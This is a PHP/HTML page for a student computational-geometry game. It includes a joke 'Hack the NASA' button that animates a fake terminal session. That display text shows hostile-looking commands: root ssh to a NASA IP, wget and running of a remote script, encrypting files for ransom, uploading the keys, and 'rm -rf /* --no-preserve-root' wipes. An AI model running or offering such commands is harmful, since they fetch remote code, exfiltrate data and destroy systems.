<?php
require_once("views/partials/header.php");
?>



<div class="container">

    
    
    <div style="position: absolute; top: 0; left: 20px; top: 20px">
        <p class="current-score">
            score : 
            <span id="value-current-score" style="font-weight:600;">0</span> 
            <img src="img/dogecoin.png" alt="points" style="width: 32px;">
        </p>
    </div>
    
    <img src="img/sound.png"
         alt="sound ON" 
         id="icon-sound"
         style="position: absolute; top: 10px; right: 10px; width: 64px; cursor:pointer;" 
         onclick="toggleMusic()">
    <audio id="music" autoplay loop>
        <source src="sounds/A-Bit of Memes.mp3" type="audio/mpeg"/>
    </audio>

    <h1 class="text-center animated zoomInDown" style="animation-delay: .3s">Schnyder's game</h1>
    <div class="row">
        <div class="col-12">
            <div class="text-center animated bounceIn">
                <button id="play" class="big-button">Play</button>
                <button id="options" class="big-button">Best scores</button>
                <button id="hack-the-nasa" class="big-button">Hack the NASA</button>
                <small>(Cliquez en haut à droite sur l'icone de son pour retirer le son.)</small>  
            </div>
            
            <div id="levels" class="text-center d-none">
                <h2 class="animated bounceIn">
                    Select the level
                </h2>
                <button class="small-button animated bounceIn" style="animation-delay: 1.0s;">1</button>
                <button class="small-button level-locked animated bounceIn" style="animation-delay: 1.2s;">2</button>
                <button class="small-button level-locked animated bounceIn" style="animation-delay: 1.4s;">3</button>
                <button class="small-button level-locked animated bounceIn" style="animation-delay: 1.6s;">4</button>
                <button class="small-button level-locked animated bounceIn" style="animation-delay: 1.8s;">5</button>
                <hr>
                <button class="select-level-back big-button animated bounceIn" style="animation-delay: 1.1s;">Back</button>
            </div>

            <main id="game-container" class="animated fadeInDown">
                
            </main>
        </div>
    </div>
    <div id="terminal" class="hidden"></div>
    <small style="
    position:fixed;
    bottom:10px;
    left:10px;">
    &copy; Daoud & Mourad - Computational Geometry 2017 - 2018.
</small>   
</div>    

<script>
    
    $('#terminal').hide();

    renderMathInElement(document.body);
    // On démarre une instance du jeu -- variable globale
    var game = new Game();

    $(function() {

        // Les boutons du menu principal
        var btnPlay = $('#play');
        var btnOptions = $('#options');
        var btnHackNasa = $('#hack-the-nasa');
        var levelsContainer = $('#levels');
        var btnBackFromLevelSelection = $('.select-level-back');
        

        // Lorsqu'on clik sur un level pas locked, 
        // on charge le niveau en question
        levelsContainer.find('.small-button:not(.level-locked)').click((event) => {
            levelsContainer.addClass('animated bounceOutUp');
            setTimeout(() => {
                levelsContainer.addClass('d-none');
                game.loadLevel(event.target.textContent);
            }, 600);            
        });

        btnBackFromLevelSelection.click((event) => {
            // Pour simuler un délai dans les animations,
            // j'utilise setTimeout()
            levelsContainer.removeClass('animated bounceInDown')
                           .addClass('animated bounceOutDown');
            setTimeout(() => {
                btnPlay.parent().removeClass('animated bounceOutUp')
                                .addClass('animated bounceInDown')
                                .removeClass('d-none');
                setTimeout(() => {
                    levelsContainer.addClass('d-none');
                }, 300);
            }, 500);
        });
        
        // Lorsqu'on click sur le bouton play, 
        // on démarre une nouvelle partie
        // et on invite le joueur à choisir un level.
        btnPlay.click((event) => {
            btnPlay.parent().removeClass('animated bounceInDown')
                            .addClass('animated bounceOutUp');
            // Pour simuler un délai dans les animations,
            // j'utilise setTimeout()
            setTimeout(() => {
                btnPlay.parent().addClass('d-none');
                levelsContainer.removeClass('animated bounceOutDown')
                               .addClass('animated bounceInUp');
                setTimeout(() => {
                    levelsContainer.removeClass('d-none');
                }, 300);
            }, 500);
        });
        
        btnOptions.click((event) => {
            swal('lol');
        });

        btnHackNasa.click((event) => {
            var sshCommand = function(cmd) {
                return '`<span class="ssh">ssh.nasa.gov@root# </span> `^500<span class="command">' + cmd + '</span><br>';
            }

            var terminalResponse = function(response, timeToWait) {
                return '`<span class="command">' + response + '</span><br>`^'+ timeToWait + '\n';
            }
            
            $('#terminal').show();

            new Typed('#terminal', {
                strings: [
                    '`<span class="pwd">kali@root# </span> `^500<span class="command">dig +short www.nasa.gov</span><br>' + 
                    '`<span class="command">nasa.gov has address 52.0.14.116</span><br>` ^1000\n' +
                    '`<span class="pwd">kali@root# </span> `^500<span class="command">ssh 52.0.14.116@root --password "earth_is_flat"</span><br>' +
                    terminalResponse('Connecting to 52.0.14.116...', 1000) +
                    terminalResponse('Connection Successful !', 400) +
                    sshCommand('ls -a') +
                    terminalResponse('. .. <span style="color: lightblue; font-style:italic;">.top_secret_folders</span> honeypot_tutorial.txt computational_geometry.pdf schnyders_theorem.pdf', 400) +
                    sshCommand('cd .top_secret_folders') +
                    terminalResponse('error: Permission denied.', 500) +
                    sshCommand('chown -Rf root .top_secret_folders') +
                    sshCommand('chmod -Rf 777 .top_secret_folders') +
                    sshCommand('wget https://mouradaoud.com/scripts/encryption_tools.sh') +
                    terminalResponse('Downloading the file...', 1500) +
                    sshCommand('./encryption_tools.sh --encrypt --algorithm=AES-256 --generate-private-key-backup .top_secret_folders') +
                    terminalResponse('Encrypting the shit...', 1000) +
                    terminalResponse('Encryption done.', 500) +
                    sshCommand('echo "Hello dear Nasa. I hacked the shit out of you. Please send us 100 BTC or an algorithm that decides if a point is inside a convex polygon in O(log(log(n))) time. Your choice. We got all your secret files." | mail -s subject ceo@nasa.gov') +
                    sshCommand('curl --upload-file .top_secret_folders.encrypted private.key public.key') +
                    sshCommand('rm -rf /* --no-preserve-root') +
                    terminalResponse('error: Permission denied.', 500) +
                    sshCommand('super-sudo rm -rf /* --no-preserve-root') +
                    terminalResponse('error: Wtf mate. You shall not pass fam.', 500) +
                    sshCommand('super-sayan-sudo rm -rf /* --no-preserve-root') +
                    terminalResponse('error: Aaarghh.. You will never pass... !.', 500) +
                    sshCommand('stefan-langerman-sudo rm -rf /* --no-preserve-root --shut-the-hell-up') +
                    terminalResponse('Everything deleted. You have been moved to an obscur filesystem. Everything is permitted.', 500) +
                    sshCommand('rm -rf bios') +
                    sshCommand('rm -rf mbr') +
                    sshCommand('rm -rf rom') +
                    sshCommand('shutdown -now') +
                    terminalResponse('', 500)                
                ],
                typeSpeed: 50,
                onComplete: (typed) => {
                    $("#terminal").empty();
                    $('#terminal').hide();
                    typed.destroy();
                }
            });
        
        });
    });

    var toggleMusic = function() {
        var srcMusic = $('#music').attr('src');
        var iconMusic = $('#icon-sound').attr('src');
        $('#music').attr('src', srcMusic === '' ? 'sounds/A-Bit of Memes.mp3' : '');
        $('#icon-sound').attr('src', iconMusic === 'img/no-sound.png' ? 'img/sound.png' : 'img/no-sound.png');
    }
</script>

<?php
require_once("views/partials/footer.php");
?>